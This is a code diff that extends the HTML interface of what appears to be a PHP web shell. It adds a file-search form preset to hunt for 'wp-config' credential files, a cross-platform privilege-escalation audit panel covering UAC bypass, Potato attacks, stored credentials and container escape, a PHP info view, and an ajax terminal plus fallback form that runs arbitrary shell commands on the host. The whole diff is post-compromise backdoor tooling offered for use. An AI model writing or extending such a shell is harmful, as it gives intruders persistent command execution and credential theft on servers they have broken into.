@@ -27,4 +27,18 @@
                     <input type='text' placeholder='' name='sqlpass'/></td></tr>
                     <tr><td><label></label></td><td>
                     <input type='submit' value='Connect' name='connect_sql'/></td></tr></table>
-                    </form></fieldset>||<section class='searchbox'><h3>File Search (v2.3)</h3><p>Use ?dfaction=search — recursive keyword + extension search (capped 500 results).</p></section>||<section class='lpe'><h3>Auto Privilege Escalation Audit (v2.5)</h3><p>Use ?dfaction=lpe — automated enumeration of SUID/SGID, capabilities, writable paths, Docker socket, sudo, cron jobs, password hashes, and container detection.</p></section>
+                    </form></fieldset>||<section class='searchbox'><h3>File Search <small style='color:#888'>(v2.6)</small></h3><form action='' method='POST'><table>
+                    <tr><td><label>Base path : </label></td><td><input type='text' name='searchpath' value='%{BASE}%' style='width:320px'></td></tr>
+                    <tr><td><label>Keyword : </label></td><td><input type='text' name='searchkey' value='%{KEY}%' placeholder='wp-config'></td></tr>
+                    <tr><td><label>Extension : </label></td><td><input type='text' name='searchext' value='%{EXT}%' placeholder='php (optional)'></td></tr>
+                    <tr><td></td><td><input type='submit' name='dfsearch' value='Search'></td></tr></table></form>
+                    <div class='scanresults'>%{RESULTS}%</div></section>||<section class='lpe'><h3>Auto Privilege Escalation Audit <small style='color:#888'>(v2.6 — Cross-Platform)</small></h3>
+                    <p class='lpe-intro'>Automated privilege escalation audit across <b>Linux</b> (SUID/SGID, capabilities, kernel CVEs, writable passwd &amp; system paths, sudo, cron, Docker, NFS, Polkit, container escape) and <b>Windows</b> (token privileges, unquoted services, writable binaries, AlwaysInstallElevated, UAC bypass, autorun keys, scheduled tasks, stored credentials, DLL hijacking, Potato, vulnerable drivers). Spawns subprocesses — allow 10-60 s.</p>
+                    <div class='lpe-output'>%{LPE}%</div></section>||<section class='fileinfo'><h3>PHP Info</h3>
+                    <div class='pi-dark'>%{PI}%</div></section>||<section id='cmd_area'><p class='dfs-cwd'>cwd: %{CWD}% &nbsp;|&nbsp; exec: <b>%{EXEC}%</b></p>
+                    <div id='ajaxterm'><div class='dfs-ajax-hint'>Ajax terminal ready — type a command below. History: up/down arrows.</div></div>
+                    <form id='ajaxform' action='' method='POST' autocomplete='OFF' onsubmit='return dfsAjaxRun()'><input id='ajaxinput' type='text' placeholder='whoami (ajax, no reload)' autofocus></form>
+                    <details class='dfs-classic'><summary>Classic form (page reload fallback)</summary>
+                    <form action='' method='POST' autocomplete='OFF'><textarea class='cmd_response' readonly='TRUE'>%{OUT}%</textarea><br><input type='text' name='dfscmd' placeholder='whoami' value='%{LASTCMD}%'><br><button>Execute</button></form>
+                    </details>
+                    <p class='dfs-tip'>Tip: new in v2.6 — ajax terminal above runs without reload.</p></section>
